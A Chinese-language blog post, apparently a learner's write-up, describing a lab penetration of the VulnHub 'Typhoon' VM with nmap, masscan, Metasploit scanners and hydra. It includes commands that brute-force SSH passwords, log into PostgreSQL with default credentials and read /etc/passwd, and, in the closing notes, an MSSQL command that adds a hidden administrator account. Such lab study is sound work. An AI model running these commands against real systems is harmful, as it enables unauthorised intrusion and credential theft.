---
title: 'typhoon靶机渗透'
date: 2019-08-09
updated: 2019-08-20
category: 'vulstudy'
tags:
  - '靶机'
  - 'nfs'
  - 'nmap'
lang: 'zh'
draft: false
---
昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。

今天又重新从 [https://vulnhub.com](https://vulnhub.com) 上把靶机搞下来装到Vmware上自己实验

靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用`arp-scan`和`masscan`工具

```
# root @ kali in ~ [3:04:28] C:1
$ arp-scan 192.168.41.0/24
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.41.1	00:50:56:c0:00:08	VMware, Inc.
192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.
192.168.41.166	00:0c:29:d7:ef:a4	VMware, Inc.
192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.

62 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded
```

前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址

用`masscan`也可以发现,同时端口也可以扫出来

```
# root @ kali in ~ [3:04:28] C:1
$ masscan -p0-65535 192.168.41.0/24 --rate=1000000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [65536 ports/host]
Discovered open port 631/tcp on 192.168.41.166                                 
Discovered open port 139/tcp on 192.168.41.166                                 
Discovered open port 80/tcp on 192.168.41.166                                  
Discovered open port 22/tcp on 192.168.41.166                                  
Discovered open port 5432/tcp on 192.168.41.166                                
Discovered open port 995/tcp on 192.168.41.166                                 
Discovered open port 110/tcp on 192.168.41.166                                 
Discovered open port 445/tcp on 192.168.41.166                                 
Discovered open port 3306/tcp on 192.168.41.166                                
Discovered open port 27017/tcp on 192.168.41.166                               
Discovered open port 44337/tcp on 192.168.41.166                               
Discovered open port 6379/tcp on 192.168.41.166                                
Discovered open port 53/tcp on 192.168.41.2                                    
Discovered open port 25/tcp on 192.168.41.166                                  
Discovered open port 40811/tcp on 192.168.41.166                               
Discovered open port 33070/tcp on 192.168.41.166                               
Discovered open port 993/tcp on 192.168.41.166                                 
Discovered open port 43074/tcp on 192.168.41.166                               
Discovered open port 21/tcp on 192.168.41.166                                  
Discovered open port 53/tcp on 192.168.41.166                                  
Discovered open port 2049/tcp on 192.168.41.166                                
Discovered open port 37535/tcp on 192.168.41.166                               
Discovered open port 8080/tcp on 192.168.41.166                                
Discovered open port 143/tcp on 192.168.41.166
```

nmap扫描最常用命令`nmap -sV -A -p- ip`可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务

```
Nmap scan report for 192.168.110.164
Host is up (0.00034s latency).
Not shown: 985 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.110.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)
|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)
|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)
|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/mongoadmin/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Typhoon Vulnerable VM by PRISMA CSI
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      43523/tcp  mountd
|   100005  1,2,3      58512/udp  mountd
|   100021  1,3,4      39728/udp  nlockmgr
|   100021  1,3,4      59010/tcp  nlockmgr
|   100024  1          39860/udp  status
|   100024  1          57414/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl     2-3 (RPC #100227)
3306/tcp open  mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP
Running: Actiontec embedded, Linux
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel
OS details: Actiontec MI424WR-GEN3I WAP
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

同时还有一个扫描结果：以前似乎没有看到过

```
Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s
| nbstat: NetBIOS name: TYPHOON, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   TYPHOON<00>          Flags: <unique><active>
|   TYPHOON<03>          Flags: <unique><active>
|   TYPHOON<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: typhoon
|   NetBIOS computer name: TYPHOON\x00
|   Domain name: local
|   FQDN: typhoon.local
|_  System time: 2019-08-09T11:30:49+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-09 04:30:48
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.04 ms 192.168.41.2
2   0.17 ms 192.168.110.164
```

我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令：  
`nmap -sV --script=nfs-showmount ip`扫出可以远程挂载的目录

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png)

之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。

队友打了21号端口，但是信息也不是很多

22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名，

> 发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试

在GitHub上找了一个ssh\_enum的脚本，尝试一下还行但是没有好字典

hydra可以爆破弱口令： `hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150`

第一次渗透感觉还不是很熟练，能够做到的就是这些:cry:

### 21号端口

`search ftp_version`收集ftp服务器的信息

```
msf5 auxiliary(scanner/ftp/ftp_version) > exploit 

[+] 192.168.41.166:21     - FTP Banner: '220 (vsFTPd 3.0.2)\x0d\x0a'
[*] 192.168.41.166:21     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

如果这个版本的ftp有漏洞的话是不是可以getshell？

浏览器直接访问并没有什么东西  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon.png)

尝试使用`exploit/unix/ftp/vsftpd_234_backdoor`进行渗透但是没成功

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ftp0.png)

### 22端口

尝试枚举用户名为`typhoon`

成功枚举  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon0.png)

使用hydra去爆破密码`hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon1.png)

### 25端口smtp服务

获取到服务器的信息  

```
msf5 auxiliary(scanner/smtp/smtp_version) > exploit 

[+] 192.168.41.166:25     - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 192.168.41.166:25     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 5432端口postgresql服务

补充一点postgresql操作：

列出数据库`\l`：

```
postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(3 rows)
```

列出table’\\d’:

```
ostgres=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | mrlee | table | postgres
(1 row)
```

之后使用metasploit的模块去收集信息

```
msf5 auxiliary(scanner/postgres/postgres_version) > exploit 

[*] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

直接发现弱口令  

```
[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1
[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
```

然后登陆  

```
# root @ kali in ~ [3:34:50] C:127
$ psql -h 192.168.41.166 -U postgres
Password for user postgres: 
psql (11.2 (Debian 11.2-2), server 9.3.4)
Type "help" for help.

postgres=# help
```

`select pg_ls_dir('./');`列出目录

```
postgres=# select pg_ls_dir('./');
    pg_ls_dir    
-----------------
 PG_VERSION
 pg_notify
 pg_multixact
 pg_subtrans
 pg_serial
 pg_snapshots
 pg_stat
 pg_clog
 pg_xlog
 base
 pg_twophase
 pg_tblspc
 global
 pg_stat_tmp
 postmaster.opts
 postmaster.pid
(16 rows)
```

建表并且从`/etc/passwd`中拷贝数据过来再读取,（这个姿势第一次见）

```
postgres=# DROP TABLE if EXISTS MrLee;
NOTICE:  table "mrlee" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE MrLee(t TEXT);
CREATE TABLE
postgres=# COPY MrLee FROM '/etc/passwd';
COPY 44
postgres=# SELECT * FROM MrLee limit 1 offset 0;
                t                
---------------------------------
 root:x:0:0:root:/root:/bin/bash
(1 row)

postgres=# SELECT * FROM MrLee;
                                         t                                         
-----------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

## DC1靶机

> 姿势： find命令提权，hydra爆破，[Drupal重置管理员密码](http://drupalchina.cn/node/2128)

## 需要积累一些靶机渗透的经验

### msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https

[msf各种弱口令爆破](https://www.cnblogs.com/-qing-/p/10128915.html)

### 同时需要熟悉find和grep命令

[Linux find和grep命令](https://www.cnblogs.com/-qing-/p/10867549.html)

### 熟悉一下各种cms的常见姿势

[忘记Drupal的管理员密码的解决办法](http://drupalchina.cn/node/2128)

### metasploit渗透mssql服务

1433端口对应于mssql服务，第一步一般是弱口令：  
`use auxiliary/scanner/mssql/mssql_login` 然后设置字典路径和远程主机即可

还可以使用`auxiliary/scanner/mssql/mssql_ping`进一步收集信息

之后尝试登陆mssql服务  
`use auxiliary/admin/mssql/mssql_exec` 可以设置cmd`set CMD cmd.exe /c net user`

添加管理员用户，远程登陆：  
`cmd.exe /c net user shenlan test /add&net localgroup administrator shenlan /add`

开启3389端口一般是提供远程桌面服务，

[渗透之——Metasploit渗透MSSQL](渗透之——Metasploit渗透MSSQL)

### masscan扫描工具

扫描指定网络和端口：  
`masscan.exe -p80 192.168.81.1/24`

扫描指定主机所有开放的端口：

> masscan.exe -p0-65535 192.168.81.143

`--banners`可以获取服务器的banner信息 `--echo`选项将配置信息保存下来，这样可以下一次快速扫描

> masscan.exe -p80,443,3306 192.168.81.143 —banners —echo>1.conf 保存配置信息  
> masscan.exe -c 1.conf 读取配置信息

`--rate`提高扫描速度  
[渗透技巧：Windows平台运行Masscan和Nmap](渗透技巧：Windows平台运行Masscan和Nmap)

### nmap高级使用技巧

nmap常见的扫描方式：

半开放扫描: -sS 没有建立三次握手连接，速度很快  
全连接扫描：-sT 三次握手过程，速度较慢  
扫描UDP端口： -sU
